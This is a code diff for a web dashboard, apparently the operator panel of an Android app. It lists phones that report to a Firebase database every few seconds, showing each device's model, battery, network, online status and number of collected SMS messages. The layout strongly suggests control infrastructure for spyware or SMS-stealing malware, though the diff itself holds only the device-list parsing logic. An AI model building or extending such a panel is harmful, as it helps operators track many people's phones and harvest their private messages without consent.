@@ -440,45 +440,56 @@ var DB, allDevs=[], selDev='', activeListeners={};
 function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
 
 // ═══ DEVICE LISTENER ═══
-function startDeviceListener(){
-  // Listen to devices_status — tiny summary node written by APK every 3s
-  // Each entry is ~200 bytes. 1000 devices = 200KB total. Loads instantly.
-  DB.ref('devices_status').on('value', function(snap){
-    var raw = snap.val(); allDevs = [];
-    if(!raw){ renderSidebar(); updateStats(); return; }
-    var now = Date.now();
-    Object.keys(raw).forEach(function(k){
+function parseDevices(raw, useNewPath){
+  var now = Date.now(); allDevs = [];
+  if(!raw){ renderSidebar(); updateStats(); return; }
+  Object.keys(raw).forEach(function(k){
+    var on, name, brand, android, battery, network, charging, lastSeen, smsCount;
+    if(useNewPath){
       var s = raw[k];
       var ts = s.ts||0;
       var tsAge = (ts>0 && now>ts)?(now-ts):0;
-      var on = (s.online===true)||(tsAge>0&&tsAge<300000);
-      allDevs.push({
-        id:       k,
-        name:     s.name||'Unknown',
-        brand:    s.brand||'',
-        android:  s.android||'',
-        status:   on?'online':'offline',
-        battery:  s.battery||0,
-        network:  s.network||'?',
-        charging: s.charging||false,
-        lastSeen: ts,
-        smsCount: s.sms_count||0
-      });
-    });
-    allDevs.sort(function(a,b){
-      return a.status==='online'&&b.status!=='online'?-1:
-             a.status!=='online'&&b.status==='online'?1:
-             b.lastSeen-a.lastSeen;
-    });
-    if(!selDev&&allDevs.length>0) selDev=allDevs[0].id;
-    if(selDev&&!allDevs.find(function(d){return d.id===selDev;}))
-      selDev=allDevs.length>0?allDevs[0].id:'';
-    document.getElementById('mainLayout').style.display='flex';
-    renderSidebar(); updateStats();
-    // Auto-open first device only once (not on every 3s update)
-    if(selDev && !document.getElementById('deviceDetail').classList.contains('loaded')) {
-      document.getElementById('deviceDetail').classList.add('loaded');
-      openDevice(selDev);
+      on       = (s.online===true)||(tsAge>0&&tsAge<300000);
+      name     = s.name||'Unknown'; brand = s.brand||''; android = s.android||'';
+      battery  = s.battery||0; network = s.network||'?'; charging = s.charging||false;
+      lastSeen = ts; smsCount = s.sms_count||0;
+    } else {
+      var d = raw[k], info = d.device_info||{}, live = d.live_data||{};
+      var ts = live.timestamp_millis||0;
+      var tsAge = (ts>0 && now>ts)?(now-ts):0;
+      on       = (d.online_status===true)||(d.online_status==1)||(tsAge>0&&tsAge<300000);
+      name     = info.device_model||'Unknown'; brand = info.device_brand||''; android = info.android_version||'';
+      battery  = live.battery_level||0; network = live.network_type||'?'; charging = live.is_charging||false;
+      lastSeen = ts; smsCount = d.all_sms?d.all_sms.total_count||0:0;
+    }
+    allDevs.push({id:k,name:name,brand:brand,android:android,
+      status:on?'online':'offline',battery:battery,network:network,
+      charging:charging,lastSeen:lastSeen,smsCount:smsCount});
+  });
+  allDevs.sort(function(a,b){
+    return a.status==='online'&&b.status!=='online'?-1:
+           a.status!=='online'&&b.status==='online'?1:b.lastSeen-a.lastSeen;
+  });
+  if(!selDev&&allDevs.length>0) selDev=allDevs[0].id;
+  if(selDev&&!allDevs.find(function(d){return d.id===selDev;}))
+    selDev=allDevs.length>0?allDevs[0].id:'';
+  document.getElementById('mainLayout').style.display='flex';
+  renderSidebar(); updateStats();
+  if(selDev && !document.getElementById('deviceDetail').classList.contains('loaded')) {
+    document.getElementById('deviceDetail').classList.add('loaded');
+    openDevice(selDev);
+  }
+}
+
+function startDeviceListener(){
+  // Try devices_status first (new APK - fast, lightweight)
+  DB.ref('devices_status').once('value', function(snap){
+    if(snap.exists() && snap.numChildren() > 0){
+      // New APK data exists - use fast path with real-time updates
+      DB.ref('devices_status').on('value', function(s){ parseDevices(s.val(), true); });
+    } else {
+      // Old APK / no devices_status yet - fallback to devices path
+      DB.ref('devices').on('value', function(s){ parseDevices(s.val(), false); });
     }
   });
 }
